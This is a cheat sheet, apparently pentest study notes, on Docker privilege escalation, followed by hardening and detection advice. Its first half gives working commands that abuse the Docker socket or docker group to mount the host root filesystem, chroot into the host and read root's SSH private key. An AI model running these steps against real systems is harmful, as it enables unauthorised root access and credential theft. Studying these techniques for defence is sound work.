## Docker Privilege Escalation Techniques

### Check Docker Version
Determine the installed Docker version.

```bash
docker version
```

### List Docker Images
View available Docker images.

```bash
docker image ls
```

### List Docker Containers
Show all running and stopped Docker containers.

```bash
docker ps -a
```

### Check User's Docker Group Membership
Check if the user is part of the `docker` group, which may allow privilege escalation.

```bash
id
```

### Locate Docker Socket
Check the default location of the Docker socket.

```bash
ls -l /var/run/docker.sock
```

### Download Docker Binary (If Not Available in Container)
Fetch the Docker binary in case it's missing.

```bash
wget <URL_TO_DOCKER_BINARY> -O docker
chmod +x docker
```

### List Running Containers via Docker Socket
Use the Docker socket to list running containers.

```bash
./docker -H unix:///var/run/docker.sock ps
```

### Run a Privileged Container with Host Root Mount
Start a privileged container and mount the hostâ€™s root filesystem.

```bash
./docker -H unix:///var/run/docker.sock run --rm -d --privileged -v /:/hostsystem <image_name>
```

### Execute a Shell in the Privileged Container
Gain shell access inside the privileged container.

```bash
./docker -H unix:///var/run/docker.sock exec -it <container_id> /bin/bash
```

### Access Host Files from Within the Container
View sensitive host files inside the container.

```bash
cat /hostsystem/root/.ssh/id_rsa
```

### Run a Container with a Chroot into the Host
Use `chroot` to access the host system from inside a container.

```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### Check If Docker Socket is Writable
Ensure that the Docker socket has the appropriate permissions.

```bash
ls -l /var/run/docker.sock
```

### Using Docker Compose to List Running Containers
View running containers using Docker Compose.

```bash
docker-compose ps -a
```

### Using Docker Compose to Execute a Shell in a Container
Access a shell within a running container using Docker Compose.

```bash
docker-compose exec <container_name> /bin/bash
```

### Using Docker Compose to Check Service Configurations
Inspect service configurations in Docker Compose.

```bash
docker-compose config --services <service_name>
```



## **Key Concepts:**

- **Docker Architecture:**
    - Docker Daemon (server): Manages containers, images, networks, and storage.
    - Docker Client: Interface for interacting with the Daemon.
    - Docker Compose: Orchestrates multi-container applications.
    - Docker Desktop: GUI for managing Docker.
- **Docker Images and Containers:**
    - Images: Read-only templates.
    - Containers: Mutable instances of images.
- **Privilege Escalation Vectors:**
    - **Shared Directories (Volume Mounts):** Accessing sensitive host files.
    - **Docker Sockets:** Abusing the Docker daemon socket for control.
    - **Docker Group:** Membership grants control over the Docker daemon.
    - **Writable Docker Sockets:** Abusing writable docker sockets when the user is not in the docker group.

### **Exploitation Techniques:**

- **Shared Directories:**
    - Locating mounted host directories within the container.
    - Accessing sensitive files (e.g., SSH private keys).
- **Docker Sockets:**
    - Locating the `docker.sock` file.
    - Using the `docker` binary (or downloading it) to interact with the socket.
    - Running privileged containers with host root mounts.
    - Using docker run with a chroot into the host system.
- **Docker Group:**
    - Checking user group membership (`id`).
    - Exploiting the ability to run arbitrary Docker commands.
- **Writable Docker Sockets:**
    - Checking permissions on the docker.sock file.
    - Executing commands through the docker socket to gain root on the host.

### **Important Considerations and Enhancements:**

- **Security Best Practices:**
    - Minimize volume mounts.
    - Use read-only mounts when possible.
    - Restrict access to the Docker socket.
    - Avoid running containers with `--privileged`.
    - Implement proper user and group management.
    - Use security scanning tools for docker images.
    - Use docker rootless mode.
- **Attack Vectors:**
    - Exploiting vulnerabilities in the Docker daemon itself.
    - Compromised Docker images.
    - Misconfigured Docker Compose files.
- **Detection:**
    - Monitor Docker socket activity.
    - Audit Docker configurations.
    - Use intrusion detection systems.
- **Containerization Security:**
    - Understanding Docker security is crucial for modern infrastructure.
    - Tools like Docker Bench for Security and Clair can help assess security.
- **Namespaces and Cgroups:** Reinforce the importance of namespaces and cgroups in docker security.
- **Real World Examples:** Researching real world docker escapes will help solidify understanding of the attack vectors.
- **Rootless Docker:** Modern docker installations can run in rootless mode, which greately reduces the attack surface.
- **Docker Capabilities:** Docker utilizes linux capabilities, and those can be missused.
